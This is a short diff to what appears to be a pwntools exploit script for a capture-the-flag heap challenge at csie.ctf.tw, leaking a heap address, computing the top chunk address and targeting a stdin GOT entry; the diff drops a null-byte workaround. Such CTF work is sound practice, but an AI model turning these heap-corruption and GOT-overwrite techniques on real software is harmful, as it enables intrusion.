@@ -4,7 +4,6 @@ context.arch='amd64'
 
 host = 'csie.ctf.tw'
 port = 10141
-
 r = remote(host, port)
 
 def allocate_heap(size, data, sendline=True, top=0, top_size=0):
@@ -43,8 +42,6 @@ show_heap()
 r.recvuntil('a'*0x10)
 heap = u64(r.recvuntil('\n')[:-1].ljust(8, b'\x00'))
 top = heap + (0x1e14010 - 0x1df2030)
-if top < 0x602030: # that means there is a null byte (0x00) inside the address of top chunk
-    top += 0x10000000
 # print('top =', hex(top))
 
 glibc_stdin_got = 0x602030
